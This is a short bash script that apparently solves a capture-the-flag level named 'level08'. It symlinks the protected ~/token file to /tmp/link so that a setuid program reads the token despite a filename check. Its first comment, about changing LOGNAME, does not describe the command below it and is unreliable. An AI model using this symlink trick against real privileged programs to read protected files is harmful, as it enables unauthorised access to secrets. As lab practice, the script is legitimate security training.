#!/bin/bash
set -x

# 1. Change the LOGNAME env variable to getflag command
ln -sf ~/token /tmp/link

# 2. Execute the C program
./level08 /tmp/link